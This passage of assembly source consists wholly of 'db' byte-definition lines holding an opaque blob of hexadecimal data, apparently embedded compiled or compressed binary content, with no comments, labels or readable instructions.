db 076h,08bh,00ch,0b3h,089h,0aeh,085h,030h,09ah,048h,02eh,028h,0ech,00dh,07ch
db 0b3h,004h,012h,0fah,089h,0f6h,004h,0b3h,0a5h,001h,064h,081h,023h,0f1h,0ffh
db 054h,0ebh,0c3h,064h,08fh,04ch,0d1h,091h,0c4h,067h,0e1h,031h,0cah,064h,08bh
db 00dh,0abh,008h,09dh,0a0h,081h,079h,004h,075h,002h,0fbh,044h,088h,051h,052h
db 00ch,039h,051h,0dah,0b6h,061h,08ch,005h,0b0h,043h,002h,065h,051h,0bbh,0a4h
db 0a1h,023h,0e7h,0deh,0b0h,008h,097h,07eh,04bh,025h,050h,04eh,086h,043h,06bh
db 00ch,059h,05bh,0a2h,000h,0f0h,02eh,0cch,0cch,056h,043h,032h,030h,058h,043h
db 030h,030h,048h,01fh,0d1h,03fh,008h,0fch,059h,08ch,038h,080h,083h,08dh,01ch
db 0d1h,0f7h,040h,086h,0c2h,0c8h,0b8h,089h,045h,0f8h,05dh,089h,0d0h,001h,0fch
db 08eh,0f0h,0f8h,0e7h,073h,0bch,081h,082h,011h,07bh,008h,061h,08dh,00ch,076h
db 083h,06eh,000h,047h,08fh,074h,045h,056h,055h,08dh,06bh,010h,041h,006h,013h
db 096h,05dh,05eh,00bh,046h,096h,00bh,090h,033h,078h,03ch,053h,0b7h,098h,037h
db 002h,01bh,004h,02fh,0ceh,098h,065h,056h,05dh,008h,091h,0c2h,028h,06bh,08fh
db 089h,06fh,092h,0bdh,08fh,078h,0b9h,02fh,0aah,00ch,008h,0dbh,008h,0a8h,05dh
db 08bh,034h,08fh,0ebh,0a1h,0b8h,09bh,058h,032h,042h,0ebh,01ch,0ebh,015h,02dh
db 0ebh,05fh,088h,06ah,0ffh,05dh,010h,045h,0adh,066h,055h,02ch,040h,0bfh,0d5h
db 029h,08bh,041h,01ch,050h,0dch,016h,0b9h,030h,018h,050h,0a9h,0c3h,050h,032h
db 0a1h,0c0h,078h,08ch,09ah,00dh,02ah,083h,03dh,0f4h,081h,05fh,020h,02fh,0e4h
db 021h,068h,0fch,086h,09ch,021h,0d5h,0a1h,048h,08bh,015h,009h,04eh,059h,0a1h
db 044h,055h,08bh,0ffh,059h,084h,000h,0cfh,0b2h,0a4h,08bh,055h,008h,033h,0c9h
db 0b8h,0b8h,088h,072h,0b4h,0f4h,00bh,078h,0d0h,0f0h,01ah,041h,03dh,048h,016h
db 0a0h,09fh,086h,072h,0f1h,0f1h,0c1h,0e6h,003h,03bh,096h,072h,030h,047h,0d2h
db 01ch,001h,0cch,025h,053h,0ech,0d0h,0fdh,084h,0d7h,00dh,072h,0aah,027h,01eh
db 0d7h,081h,0fah,014h,0ebh,0a0h,0c7h,0f1h,05ch,070h,025h,02dh,073h,0fch,05ah
db 0c2h,077h,013h,0f4h,011h,04dh,01ah,051h,074h,051h,02ch,02dh,0f6h,059h,057h
db 0c8h,074h,02ch,0bch,0bdh,082h,072h,042h,0f6h,040h,059h,03ch,076h,029h,0d5h
db 0a4h,0c5h,0d9h,050h,042h,0dch,01ch,06ch,083h,033h,098h,000h,0dbh,06ah,003h
db 003h,0f8h,068h,0f0h,057h,0dah,0e9h,057h,0c5h,044h,0cbh,06eh,055h,013h,00eh
db 060h,0ffh,068h,0d4h,05bh,0c6h,02ch,086h,057h,09bh,0d6h,055h,0eah,0bch,0d0h
db 0a3h,0b3h,075h,00eh,0b6h,0bch,082h,073h,071h,068h,081h,068h,010h,020h,001h
db 068h,0a8h,0a6h,040h,036h,0f1h,044h,03fh,02ch,05fh,0ebh,026h,0c1h,067h,05eh
db 099h,0e0h,009h,0b1h,096h,06ah,022h,007h,09ah,094h,01bh,0e5h,078h,028h,06ah
db 0f4h,0f4h,08fh,0cch,0f3h,05ch,05eh,057h,0b2h,038h,0a2h,06ah,038h,02bh,0b0h
db 015h,039h,05dh,010h,094h,0f8h,052h,065h,045h,0e8h,0a8h,095h,047h,00ch,03dh
db 027h,018h,018h,08ch,052h,043h,0f0h,039h,01dh,068h,020h,0f0h,05dh,0c2h,03bh
db 0cbh,074h,007h,066h,093h,0d8h,0ceh,0beh,001h,095h,08eh,024h,07eh,0ebh,0e1h
db 02ch,08ch,01ch,035h,04dh,0a1h,068h,0aeh,0a1h,03ch,0ebh,07eh,02ah,039h,06bh
db 049h,087h,000h,07ch,02fh,00ah,0deh,093h,000h,008h,00fh,095h,0c1h,051h,050h
db 056h,06ah,009h,0a6h,0c9h,004h,03fh,078h,0f6h,0e6h,0adh,008h,0a0h,04ch,0c1h
db 074h,031h,075h,09dh,072h,005h,038h,05eh,038h,014h,04bh,061h,093h,0f0h,0cah
db 02ah,09fh,0cch,096h,0f4h,084h,0d2h,0a2h,0f5h,0a7h,07fh,0dah,0a5h,0bfh,023h
db 0c8h,0a1h,095h,079h,0d2h,003h,016h,0feh,0ebh,0cah,0cch,0d3h,0b4h,0c8h,07ch
db 00ch,032h,062h,0a4h,043h,047h,048h,0d0h,04fh,0dah,0f9h,083h,0fah,092h,04fh
db 005h,0dch,02dh,0f7h,0d9h,00ah,001h,090h,0ach,008h,02bh,0d1h,088h,007h,047h
db 049h,075h,0fah,047h,09ah,008h,0d0h,0e0h,008h,028h,016h,01eh,019h,010h,0cah
db 083h,0e2h,0e9h,0eah,00bh,0dch,081h,006h,0f3h,0abh,0e8h,0dfh,073h,05ch,006h
db 04ah,05fh,0c3h,0cfh,013h,066h,0b1h,004h,0a0h,08bh,013h,084h,07eh,00eh,06ah
db 0a3h,06dh,037h,09eh,096h,08eh,032h,00bh,0feh,048h,0ech,082h,00ch,0b9h,04bh
db 081h,08dh,048h,001h,081h,0f9h,077h,00ch,013h,0beh,0e5h,0e1h,0b7h,0ebh,052h
db 039h,0cfh,08ah,0b4h,086h,06ch,090h,0c8h,0c1h,0b6h,0d1h,060h,024h,08eh,079h
db 056h,05eh,001h,020h,02ch,0c5h,065h,0feh,04dh,0fch,088h,045h,0fdh,06ah,002h
db 0ebh,009h,0b4h,049h,08eh,066h,0fdh,007h,034h,0f4h,066h,08dh,04dh,00ah,05ah
db 018h,0c1h,0adh,051h,068h,02fh,0cbh,089h,045h,0d2h,0cch,0d6h,028h,0c7h,01ch
db 002h,080h,069h,0f9h,087h,045h,00ah,023h,045h,00ch,0e3h,016h,03fh,0c5h,085h
db 0b3h,07eh,055h,04ch,00bh,0c8h,086h,0c0h,00dh,08bh,00ch,075h,009h,0f7h,0e1h
db 050h,02ch,0f0h,0a9h,053h,08bh,0d8h,04eh,016h,050h,0b7h,0f7h,064h,024h,014h
db 003h,054h,05bh,078h,046h,0d3h,05bh,010h,00bh,0e8h,07fh,080h,0f9h,040h,073h
db 015h,058h,001h,08eh,000h,020h,073h,006h,00fh,0a5h,0c2h,0d3h,0e0h,0d0h,0c5h
db 06fh,020h,0a0h,080h,0e1h,01fh,0d3h,0e2h,033h,0d2h,01eh,006h,01ch,02eh,08bh
db 046h,00ch,0a8h,083h,005h,031h,0c4h,0c3h,0c4h,0a8h,040h,0bch,003h,0f2h,091h
db 08eh,00ah,00ch,020h,089h,046h,0b0h,080h,0c7h,010h,029h,07eh,00ch,001h,066h
db 0a9h,09ah,07fh,06dh,0ceh,03bh,0d1h,050h,01bh,049h,011h,059h,02ch,080h,00eh
db 0c4h,046h,006h,0ffh,076h,018h,079h,08ch,0cch,021h,008h,047h,0cdh,0b8h,024h
db 056h,00ch,0f7h,0c0h,0ech,016h,06ch,002h,05ah,000h,080h,067h,08bh,056h,00ch
db 0f6h,0c2h,082h,075h,034h,08bh,04eh,010h,057h,083h,0f9h,014h,0dch,081h,001h
db 01fh,0c1h,0ffh,004h,063h,062h,087h,03ch,0bdh,03ch,0cfh,0bfh,098h,050h,01bh
db 07eh,043h,04fh,004h,05fh,009h,0dah,063h,06eh,082h,006h,080h,0ceh,049h,001h
db 07eh,0ech,081h,07eh,018h,013h,0ebh,04ah,0abh,04eh,002h,020h,016h,010h,0c1h
db 008h,074h,0c5h,004h,075h,007h,0c7h,046h,018h,0cfh,009h,0a2h,0a6h,08bh,00eh
db 048h,060h,0d0h,03ch,065h,00eh,05eh,0c3h,0cdh,03ch,0a4h,07fh,00ch,070h,003h
db 03eh,010h,009h,083h,047h,09dh,02ah,08eh,058h,065h,0d4h,054h,014h,047h,040h
db 030h,0fbh,0ffh,056h,074h,041h,010h,010h,0e3h,044h,0e9h,0a8h,001h,0dah,088h
db 068h,032h,075h,02eh,083h,07eh,008h,0f0h,065h,0c4h,036h,007h,08bh,006h,03bh
db 062h,03ah,0d9h,0e6h,004h,017h,0d4h,0c8h,077h,040h,0f6h,0c5h,05ch,00bh,058h
db 040h,074h,011h,0ffh,00eh,0d0h,00ah,02dh,09bh,00fh,041h,0e7h,019h,04dh,0d8h
db 027h,091h,009h,088h,018h,0ffh,024h,01bh,012h,073h,066h,0efh,08bh,0c3h,051h
db 0a8h,007h,089h,06ah,004h,04dh,03ah,014h,03fh,02ah,002h,03ch,0e4h,0b9h,0c2h
db 08ah,021h,04eh,08bh,062h,084h,088h,075h,01ch,0c6h,0c8h,04bh,035h,0a7h,068h
db 08fh,0c9h,045h,07eh,089h,075h,087h,07ch,023h,062h,0e2h,043h,0a7h,001h,0ech
db 01bh,06dh,0d8h,018h,025h,00ch,02dh,0f4h,02bh,0cch,00bh,075h,021h,034h,035h
db 0c0h,0dch,089h,0c4h,0b3h,0adh,040h,059h,050h,07fh,040h,0b6h,040h,0c9h,0b2h
db 056h,0d2h,0b8h,088h,085h,018h,060h,08fh,040h,039h,030h,074h,072h,030h,042h
db 03dh,078h,086h,041h,09ah,0d2h,03bh,0e8h,050h,085h,03dh,082h,005h,09ch,0c6h
db 009h,087h,08eh,024h,001h,06ah,040h,0e4h,00dh,085h,00dh,059h,0bfh,0e0h,083h
db 07dh,0e8h,088h,006h,00dh,05ah,0aah,0b6h,014h,06ch,088h,046h,0eah,08ah,041h
db 00fh,086h,0efh,0eeh,00bh,0d0h,039h,00fh,0bbh,04dh,0efh,08ah,011h,084h,0d2h
db 085h,060h,07bh,030h,0aeh,041h,0ffh,0a6h,072h,001h,086h,0d2h,03bh,0c2h,00fh
db 087h,093h,0d1h,08fh,068h,0c7h,0eeh,00ch,0b2h,09ch,034h,0cah,002h,022h,05bh
db 052h,0dah,080h,072h,028h,004h,0aah,08dh,09eh,098h,02dh,0c2h,00dh,031h,080h
db 03bh,06ch,01ah,024h,000h,02ch,08ah,051h,001h,001h,029h,0c6h,080h,0b0h,0fah
db 03bh,0c7h,077h,004h,017h,0d4h,053h,08ah,092h,080h,008h,060h,05ah,064h,04ch
db 090h,040h,076h,0f5h,041h,058h,029h,0b0h,019h,041h,080h,039h,0d4h,00dh,067h
db 0a2h,0a1h,083h,0c3h,0fch,0bdh,025h,085h,034h,0c1h,037h,0c6h,0aeh,008h,005h
db 0dch,0dch,050h,0a3h,040h,05ch,046h,062h,02ch,016h,07ch,016h,00eh,0feh,08ch
db 085h,0bfh,0d0h,0a5h,0c0h,004h,0edh,01bh,0a5h,059h,0a3h,0a5h,0ebh,055h,06ch
db 034h,0efh,0b4h,0c2h,02ch,0bdh,0c8h,048h,069h,008h,00eh,0a7h,008h,040h,03dh
db 0f2h,0dbh,08fh,026h,01ch,0b5h,0cch,0deh,0a6h,0e5h,0e8h,023h,0ebh,006h,058h
db 0d6h,02ch,0c2h,0abh,07ah,034h,083h,001h,0ebh,00dh,04ch,02ch,082h,0cfh,0b6h
db 049h,08fh,0a1h,05bh,044h,072h,0ebh,003h,098h,0b8h,015h,04bh,0a6h,070h,021h
db 078h,083h,025h,065h,019h,0cah,06ah,0feh,0cbh,0d2h,072h,096h,0b5h,04ch,05dh
db 041h,0ffh,025h,094h,0fdh,01bh,008h,076h,03ch,098h,0fch,075h,00fh,0a1h,0c9h
db 072h,0d9h,069h,032h,00ch,043h,062h,02dh,0a4h,074h,022h,028h,00bh,008h,062h
db 004h,035h,012h,092h,065h,0e8h,00ch,048h,04dh,010h,0b4h,08bh,0c3h,0b8h,004h
db 01dh,03bh,08ah,083h,012h,004h,008h,05bh,0b0h,02bh,00fh,011h,004h,057h,059h
db 07ah,073h,076h,0c6h,0aah,031h,0b2h,06bh,074h,0a3h,0c3h,036h,06eh,053h,0e6h
db 070h,0b3h,094h,05fh,014h,005h,0f1h,086h,002h,031h,0ech,056h,053h,0c6h,076h
db 00eh,0c7h,046h,07fh,0cfh,016h,0beh,056h,08dh,085h,040h,088h,084h,005h,0ech
db 0a1h,066h,001h,010h,0c6h,072h,0f4h,08ah,045h,0f2h,0c6h,085h,020h,084h,05ch
db 0c2h,069h,090h,057h,08dh,055h,000h,0f2h,0a3h,001h,0b6h,00ah,03bh,0c1h,077h
db 01dh,02bh,0c8h,08dh,0bch,011h,058h,098h,0bah,041h,0b8h,020h,08bh,0d9h,084h
db 098h,03ah,043h,0b0h,01eh,08ch,037h,0f3h,0aah,042h,04fh,005h,0d0h,00bh,042h
db 08ah,042h,0ffh,075h,0d0h,05fh,05bh,06ah,04ch,0e8h,0e5h,078h,0ech,0fah,069h
db 0b1h,0beh,0d4h,050h,029h,071h,020h,04eh,0feh,056h,0eah,04eh,067h,0e3h,0fdh
db 0a6h,097h,0e5h,02dh,056h,056h,0aeh,0b3h,0e3h,078h,049h,055h,0fch,03bh,04fh
db 0c8h,022h,068h,0cah,008h,06fh,0d8h,05ch,02eh,083h,0e4h,009h,08dh,08dh,066h
db 08bh,011h,02ah,0ebh,063h,010h,001h,074h,016h,041h,0e4h,004h,076h,094h,005h
db 088h,090h,0e0h,0c4h,02ah,0dah,0e2h,0ebh,01ch,039h,03ah,0d6h,016h,010h,020h
db 0fch,0e2h,016h,0d5h,094h,0a0h,0e1h,0c7h,004h,04bh,05eh,0cdh,010h,018h,0bfh
db 0ebh,049h,083h,058h,050h,08eh,041h,072h,019h,05ah,0a0h,096h,045h,05dh,0c8h
db 080h,0c1h,0c0h,096h,025h,013h,020h,088h,088h,01fh,061h,0e5h,04ch,040h,02ch
db 072h,013h,07ah,077h,00eh,0c5h,04ch,0a0h,03bh,0e9h,020h,0ebh,0e0h,0fch,04bh
db 0a9h,02ch,0beh,022h,0a8h,074h,081h,012h,06ah,0fdh,087h,01fh,043h,0c8h,033h
db 059h,0d1h,0f8h,021h,041h,0d9h,096h,0d2h,031h,04fh,08dh,0f5h,0a8h,05ah,0a1h
db 06bh,012h,02bh,09bh,016h,0d3h,00dh,00dh,091h,036h,012h,0cah,0abh,061h,02eh
db 036h,005h,051h,00fh,032h,036h,03dh,03ah,0b4h,0f5h,04ah,08bh,00dh,089h,037h
db 072h,040h,077h,0beh,098h,031h,04bh,011h,0a1h,072h,0a5h,011h,0ffh,040h,0ceh
db 0fdh,024h,044h,069h,0ebh,00fh,091h,079h,039h,035h,000h,07bh,01fh,06dh,038h
db 069h,017h,052h,072h,01ah,068h,0c4h,017h,0ebh,06ah,051h,032h,088h,038h,08bh
db 057h,0e3h,063h,070h,090h,00fh,03bh,0fbh,06dh,010h,0a9h,02bh,0eeh,0f8h,03ch
db 023h,01ah,00eh,079h,0e3h,080h,058h,04ch,00dh,0feh,0ebh,008h,0fdh,044h,088h
db 043h,00fh,0f3h,06fh,092h,019h,00ch,019h,0deh,024h,0d3h,02ch,047h,073h,071h
db 082h,064h,088h,017h,047h,0eeh,0cbh,03bh,044h,080h,089h,017h,0e9h,0e2h,0aeh
db 09dh,05ah,097h,062h,0e8h,00dh,048h,0beh,0cbh,0e1h,034h,058h,096h,04eh,0f0h
db 027h,0f7h,0c2h,012h,0e0h,0cbh,0d5h,0e5h,0c7h,023h,0cbh,0fch,0a5h,066h,0c5h
db 01ch,06bh,00ah,0c6h,047h,0e8h,0c7h,002h,0b9h,088h,0d2h,04ah,00fh,0cdh,088h
db 0cch,064h,086h,0d4h,063h,02fh,08dh,0e0h,029h,0fch,0adh,032h,077h,022h,02fh
db 0b9h,0c1h,095h,0b9h,00eh,016h,0f1h,0e9h,070h,063h,04bh,0a4h,05bh,03dh,026h
db 0d1h,0deh,0abh,04dh,00bh,02dh,007h,030h,012h,079h,015h,0bch,072h,0a1h,061h
db 088h,077h,03fh,039h,066h,0b2h,089h,06ch,053h,062h,027h,0eah,056h,02dh,040h
db 0bdh,085h,056h,070h,00fh,083h,0e6h,0c0h,02eh,0c0h,047h,0f0h,06ah,010h,05eh
db 0a4h,0a6h,069h,0d0h,04dh,0f5h,0c6h,0c1h,0e8h,07bh,022h,0a1h,05bh,00bh,011h
db 0f2h,0cdh,0b0h,0d6h,01eh,000h,078h,0bah,051h,001h,05eh,083h,0c6h,05eh,0bch
db 0d2h,0bah,054h,01fh,05eh,03dh,090h,070h,0c3h,0c8h,0f4h,00eh,08ah,089h,007h
db 02ah,080h,034h,0d0h,076h,0d1h,003h,0c6h,03bh,02ch,001h,0e3h,052h,0feh,03bh
db 0f8h,00fh,082h,078h,049h,086h,0ach,098h,0f7h,0c7h,014h,094h,070h,050h,099h
db 04dh,042h,080h,006h,072h,029h,082h,0bfh,034h,0d0h,024h,095h,088h,041h,0c7h
db 0bah,050h,086h,042h,0dch,083h,0e9h,00ch,05ch,00bh,0a2h,0c5h,003h,003h,0c8h
db 08bh,003h,0e3h,01ch,085h,0a0h,040h,08dh,098h,041h,090h,072h,05ah,074h,01eh
db 01ch,0b0h,0dch,00dh,00dh,08eh,0c3h,000h,041h,023h,0d1h,08ah,00bh,090h,055h
db 0c2h,088h,047h,001h,090h,06bh,04dh,014h,002h,0b8h,089h,023h,05bh,0c6h,0c7h
db 0b9h,075h,0b1h,0ceh,0cch,08dh,049h,074h,01ch,067h,0e5h,001h,002h,002h,02eh
db 01eh,097h,075h,0a6h,090h,046h,0ffh,0a2h,06ch,019h,047h,08ch,00eh,04bh,063h
db 0d1h,07fh,06ch,079h,09eh,0e7h,079h,064h,05ch,054h,04ch,044h,03ch,0b1h,000h
db 0d4h,0ech,08eh,0e4h,089h,044h,08fh,0e4h,0e7h,079h,09eh,0e7h,0e8h,0e8h,0ech
db 0ech,0f0h,09eh,0e7h,079h,09eh,0f0h,0f4h,0f4h,0f8h,0f8h,020h,0b2h,015h,07ah
db 0fch,08dh,09ch,023h,048h,0dch,0f0h,088h,04ah,066h,0f8h,0ffh,0f4h,03ch,087h
db 045h,0a0h,0ach,0c0h,06bh,050h,0abh,04dh,0bdh,09ch,0bah,04dh,090h,07ah,074h
db 0ceh,037h,0b4h,09bh,0d1h,071h,004h,0b5h,05eh,065h,08dh,074h,031h,0f3h,07fh
db 005h,0e7h,07ch,039h,0fch,024h,09eh,018h,047h,0b8h,00dh,0fdh,0fch,058h,0aeh
db 0d0h,0f1h,020h,043h,0f7h,0d9h,0d0h,042h,0f5h,0ach,0f6h,08eh,0deh,00eh,01dh
db 01fh,0f9h,02bh,028h,042h,061h,0b9h,02ch,0c4h,090h,038h,058h,03eh,0a3h,05dh
db 0cfh,080h,003h,0c4h,026h,0bch,08bh,003h,04eh,04fh,059h,0efh,0c8h,09ah,0b6h
db 0e3h,06ah,07dh,067h,0fdh,00ah,061h,071h,0eeh,0efh,0e7h,0f2h,0d2h,065h,08ch
db 090h,05bh,057h,0c9h,07bh,072h,037h,0d6h,08dh,0eeh,0efh,0e2h,050h,014h,053h
db 05ah,0feh,013h,0bfh,0adh,0d4h,03ch,0cfh,073h,058h,0dch,0e4h,0ech,0f4h,0fch
db 09eh,0b3h,0c7h,0f1h,004h,043h,017h,03ch,0cfh,063h,079h,01ch,01ch,018h,018h
db 014h,0f3h,03ch,0cfh,0f3h,014h,010h,010h,00ch,00ch,01ah,0f2h,03ch,0cfh,008h
db 008h,004h,004h,02ch,0feh,046h,0feh,030h,03dh,0cfh,061h,059h,038h,048h,05ch
db 072h,04fh,06bh,059h,0f7h,08eh,0d5h,07ah,0ceh,00fh,0abh,03dh,0b6h,0efh,095h
db 09eh,035h,02ch,0e2h,087h,010h,088h,0b3h,09dh,020h,087h,010h,02bh,005h,036h
db 08dh,00ch,053h,083h,065h,0f8h,006h,036h,0c3h,05ch,08ah,01fh,08dh,077h,001h
db 006h,029h,0e4h,090h,0f1h,0a8h,08fh,046h,008h,008h,005h,08ah,07ah,001h,065h
db 055h,0d0h,080h,0fbh,02dh,055h,0d0h,027h,0d9h,04dh,014h,065h,0d1h,02ch,08eh
db 005h,02bh,05fh,0a5h,07bh,01dh,04ch,006h,0e4h,0c2h,010h,00fh,08ch,08ch,00bh
db 062h,0d0h,006h,083h,06eh,0cbh,083h,021h,024h,00fh,08fh,07ah,06ah,001h,0f7h
db 0a0h,053h,059h,030h,074h,009h,0c7h,0d9h,00fh,00ch,074h,00ah,032h,0b4h,080h
db 07bh,0a8h,078h,074h,00dh,03ch,058h,0a4h,0d3h,0d0h,099h,008h,01fh,089h,05ah
db 074h,041h,058h,039h,075h,017h,038h,0fbh,04eh,03eh,004h,075h,0f1h,0a0h,086h
db 0ddh,0c7h,0c0h,034h,02eh,050h,03bh,04dh,000h,033h,0d2h,0f7h,075h,010h,0bfh
db 003h,0a7h,0f3h,013h,065h,0a7h,04eh,029h,028h,0f3h,07eh,00ch,08ch,036h,0a7h
db 014h,00bh,074h,0e2h,058h,084h,073h,0beh,0cbh,030h,042h,0adh,01bh,078h,00bh
db 057h,0d9h,017h,0fah,0eah,071h,0aah,00bh,0ebh,023h,0c7h,04ah,0c3h,0cch,00bh
db 068h,098h,04bh,0bfh,059h,08bh,0c8h,082h,055h,060h,036h,037h,03bh,073h,036h
db 0d4h,08bh,0b6h,023h,0f8h,086h,009h,0b3h,00ah,075h,0f4h,072h,014h,005h,044h
db 0cch,0a0h,03bh,0cah,076h,004h,0ebh,009h,00fh,0afh,0d4h,078h,01bh,09ah,003h
db 0f1h,010h,08ch,00ah,07bh,0fch,08ah,018h,0b6h,005h,0e7h,092h,034h,05ch,08bh
db 085h,0e1h,09eh,06ah,08bh,055h,0afh,0cah,077h,0e5h,0bch,025h,0b8h,07ah,089h
db 0a0h,016h,00ah,056h,0ebh,04dh,004h,048h,016h,0eeh,04bh,0b8h,07fh,075h,01ch
db 001h,098h,0c0h,020h,005h,075h,03eh,083h,0e1h,002h,0f8h,009h,000h,090h,09bh
db 077h,009h,085h,0c9h,075h,02ch,039h,045h,0f8h,076h,027h,0f6h,045h,014h,001h
db 09dh,03ch,0b3h,007h,022h,074h,06ch,002h,03fh,0f6h,0ebh,011h,091h,00ah,0bch
db 0cbh,080h,0f6h,0d9h,01bh,0c9h,06eh,099h,016h,0f4h,0c8h,089h,02eh,0fch,049h
db 04eh,005h,002h,050h,016h,0c7h,0fah,008h,0f8h,08dh,0a8h,098h,024h,0f7h,0d8h
db 0f8h,0ech,042h,088h,0f3h,0cch,079h,000h,041h,002h,089h,038h,05bh,058h,01ah
db 05eh,05ah,051h,03dh,06dh,09eh,009h,033h,08dh,068h,021h,0bdh,081h,081h,045h
db 0adh,02dh,027h,0b1h,06bh,021h,085h,001h,073h,0ech,022h,081h,059h,020h,08bh
db 0c4h,08bh,0e1h,050h,08ch,046h,037h,040h,0c3h,068h,0c7h,043h,0adh,057h,040h
db 06ah,022h,068h,0cbh,0a3h,0b8h,005h,0adh,00bh,0c4h,075h,001h,083h,025h,0b0h
db 0d2h,061h,02ch,099h,000h,0b4h,0f1h,058h,028h,047h,0a3h,0ach,089h,00dh,028h
db 036h,0ddh,013h,0a4h,083h,04dh,0e6h,071h,0dch,010h,058h,027h,07dh,081h,0bch
db 08dh,00ch,080h,0a1h,0e3h,019h,040h,01ch,088h,014h,0b9h,080h,0dbh,004h,02bh
db 050h,00ch,081h,0fah,000h,097h,0c4h,01bh,020h,072h,007h,083h,0c0h,014h,0ebh
db 0e8h,052h,0c0h,023h,0aeh,010h,008h,0d9h,017h,0d3h,032h,01dh,08ah,062h,084h
db 0feh,002h,0e2h,01ah,040h,0fch,02bh,079h,00ch,0c1h,0efh,0cfh,069h,0c9h,004h
db 0f3h,0d4h,075h,092h,00dh,046h,0cfh,014h,044h,04dh,090h,0ebh,0ach,040h,00eh
db 049h,01ch,00dh,0b1h,005h,0fch,00fh,085h,0e6h,08bh,014h,031h,016h,0c8h,0c1h
db 080h,031h,089h,055h,056h,0fch,020h,0e7h,019h,029h,001h,000h,0e1h,090h,089h
db 05dh,00ch,075h,07eh,0c1h,0fah,004h,04ah,083h,0fah,03fh,076h,00eh,001h,028h
db 053h,03fh,05ah,08bh,04bh,004h,03bh,04bh,08bh,082h,067h,021h,04ch,020h,073h
db 01eh,080h,06ah,006h,0eah,080h,08bh,0cah,0d3h,0ebh,002h,004h,0f7h,0d3h,021h
db 017h,060h,0b0h,001h,05ch,0b8h,044h,0feh,009h,075h,028h,021h,019h,0ebh,021h
db 08dh,04ah,0e0h,024h,096h,077h,003h,09ch,0b8h,074h,086h,017h,01dh,006h,0f2h
db 0adh,0f1h,018h,059h,004h,08bh,046h,0c7h,011h,016h,053h,094h,023h,081h,07ah
db 05bh,004h,003h,04dh,049h,04dh,08bh,029h,05ah,004h,08bh,01dh,061h,04ah,064h
db 052h,04bh,0f6h,03fh,079h,0d1h,05dh,0bdh,069h,06dh,078h,0e3h,0f4h,096h,0dch
db 056h,009h,02bh,0b4h,005h,0d1h,03dh,0c1h,0fbh,004h,096h,082h,058h,052h,04bh
db 026h,0e8h,069h,050h,0deh,076h,0deh,00eh,013h,0d5h,039h,0d1h,0c0h,068h,021h
db 0fch,03bh,0d6h,0d6h,03bh,0dah,074h,063h,08dh,069h,0c4h,09ch,071h,076h,038h
db 038h,0fah,071h,040h,083h,0fbh,01ch,0beh,06dh,060h,0beh,001h,0cbh,0d3h,0eeh
db 0f7h,0d6h,021h,074h,04ch,003h,004h,075h,026h,00bh,0b4h,051h,094h,031h,08dh
db 04bh,0e0h,0deh,08ch,0bbh,079h,0b4h,04bh,047h,0dfh,0f9h,006h,06ch,09ah,0b2h
db 010h,097h,005h,0bbh,08ah,049h,04eh,011h,0d1h,039h,08eh,004h,008h,075h,041h
db 0adh,088h,09ch,05dh,0f4h,0a1h,097h,06dh,0a2h,06fh,0beh,0c0h,026h,081h,087h
db 060h,09dh,009h,05ch,0d1h,004h,0e3h,0c5h,034h,0e1h,05eh,0f7h,075h,00fh,07ah
db 08bh,0e2h,002h,013h,089h,03bh,066h,0bfh,019h,038h,075h,060h,08ah,002h,097h
db 005h,084h,088h,04dh,00fh,0feh,0c1h,088h,073h,025h,080h,07dh,00fh,05ah,0dfh
db 00ah,060h,00eh,071h,0edh,08ah,0f5h,009h,019h,044h,019h,0b9h,040h,0bbh,009h
db 018h,0ebh,029h,010h,053h,079h,0ceh,05ch,0ech,07ch,04eh,035h,0bah,0eah,077h
db 010h,0c3h,037h,08dh,084h,009h,010h,0cbh,0b8h,086h,022h,006h,030h,081h,02ch
db 030h,0dah,0f0h,0ffh,0f7h,05ah,052h,0bfh,0e4h,0a1h,085h,0c7h,055h,025h,00dh
db 0a8h,0c0h,072h,00dh,09bh,08bh,035h,0fch,0c1h,0e1h,00fh,003h,048h,086h,06bh
db 021h,04dh,00ch,080h,068h,000h,0f3h,0b7h,060h,0b6h,053h,051h,0ffh,0d6h,00bh
db 0dfh,0d6h,0e4h,009h,050h,008h,009h,03ch,0bfh,039h,040h,010h,083h,0a4h,088h
db 073h,0eah,05ah,0d8h,095h,073h,08eh,0e4h,0feh,02dh,0e0h,0dch,080h,048h,010h
db 080h,079h,043h,009h,083h,060h,004h,0feh,043h,032h,029h,016h,083h,078h,069h
db 053h,047h,09bh,0b8h,00dh,070h,00ch,093h,022h,0b9h,049h,010h,0b1h,07ah,06dh
db 03bh,08bh,015h,030h,006h,09bh,007h,004h,080h,0c1h,0e0h,05bh,0d2h,0d0h,085h
db 0c8h,028h,05fh,006h,040h,04ch,011h,0ech,051h,08dh,048h,014h,051h,04ch,067h
db 052h,0cdh,045h,08bh,0cah,083h,0deh,005h,0ffh,00dh,03bh,005h,0b0h,076h,0cdh
db 01dh,006h,0cah,06dh,008h,014h,063h,078h,093h,086h,089h,03dh,049h,0ddh,022h
db 072h,0a3h,086h,00eh,09ah,035h,0f0h,0a0h,037h,04eh,014h,0c4h,02eh,058h,02eh
db 057h,08dh,03ch,082h,08ch,0cbh,0f0h,026h,07dh,0fch,017h,02fh,004h,0c5h,061h
db 0f0h,0c1h,0f9h,004h,049h,011h,065h,00ah,0a0h,020h,07dh,00eh,083h,0ceh,0ffh
db 042h,039h,025h,068h,0f4h,0ebh,055h,0a0h,0c9h,03ah,0b4h,0ceh,082h,0b0h,0f6h
db 0d3h,0e8h,086h,09dh,093h,0fbh,0a1h,0d8h,03bh,0dfh,014h,087h,0c1h,0b5h,008h
db 073h,019h,08bh,02dh,000h,0b0h,02eh,03bh,023h,023h,0feh,00bh,0cfh,075h,00bh
db 083h,0c3h,014h,03bh,05dh,0fch,02eh,0e0h,0b1h,088h,072h,0e7h,075h,079h,08bh
db 0dah,03bh,0d8h,02dh,09eh,07dh,064h,015h,005h,0ebh,0e6h,053h,020h,0b9h,090h
db 075h,059h,073h,011h,083h,07bh,008h,098h,0deh,0e9h,0feh,0ebh,0edh,05bh,0d4h
db 0d1h,0bdh,026h,00dh,0a4h,067h,0efh,06dh,0eeh,0c3h,03eh,071h,01fh,03ch,06fh
db 085h,0dbh,013h,01ah,0abh,0c6h,074h,014h,03dh,020h,059h,065h,0bch,0c5h,06ch
db 0aeh,040h,037h,094h,043h,038h,097h,0c9h,016h,091h,007h,0bah,095h,01bh,06ch
db 03ch,06ah,089h,01dh,08eh,011h,0d6h,082h,08bh,0fah,0e6h,021h,068h,017h,055h
db 0fch,08bh,08ch,090h,02dh,014h,0b2h,081h,08bh,07ch,090h,044h,037h,08bh,09bh
db 023h,05ah,02ch,070h,055h,019h,080h,0a1h,074h,0fch,000h,039h,0c2h,014h,09ch
